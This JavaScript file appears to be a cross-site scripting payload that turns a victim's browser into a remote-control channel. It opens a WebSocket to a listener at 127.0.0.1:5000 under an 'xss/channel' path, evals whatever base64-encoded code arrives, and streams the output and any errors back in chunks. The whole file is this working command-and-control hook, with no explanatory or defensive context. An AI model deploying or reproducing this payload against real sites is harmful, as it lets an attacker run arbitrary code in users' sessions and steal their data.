function uuidv4() {
    return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

var url = "ws://127.0.0.1:5000/xss/channel/" + uuidv4() + "/ws";
var ws = new WebSocket(url);
ws.onmessage = function (msg) {
    try{
        var output = eval(decodeURIComponent(escape(window.atob(msg.data))));
        for (let i = 0; i <= output.length; i=i+100){
            ws.send(btoa(unescape(encodeURIComponent(output.substring(i, i+100)))));
        }
    } catch(err) {
        ws.send(btoa(unescape(encodeURIComponent(err))));
    }
};